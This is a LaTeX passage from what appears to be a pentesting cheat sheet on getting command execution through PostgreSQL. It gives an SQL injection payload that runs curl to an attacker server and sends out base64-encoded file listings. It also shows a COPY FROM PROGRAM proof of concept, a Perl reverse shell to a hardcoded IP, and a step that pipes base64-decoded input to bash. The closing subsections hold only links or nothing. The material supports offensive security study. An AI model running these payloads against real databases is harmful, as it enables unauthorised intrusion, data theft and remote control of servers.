\section{RCE}

\subsection{RCE to program}
Since version 9.3, only super users and member of the group \verb+pg_execute_server_program+ can use copy for RCE (example with exfiltration):
\begin{verbatim}
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
\end{verbatim}


\href{https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5}{Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest}
\begin{verbatim}
GRANT pg_execute_server_program TO username;

#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';

COPY cmd_exec FROM PROGRAM 'echo "<base64>" | base64 -d|bash';

\end{verbatim}


\subsection{RCE with PostgreSQL Languages}
\url{https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages}


\subsection{RCE with PostgreSQL extensions}
\url{https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions}

\subsection{PostgreSQL configuration file RCE}
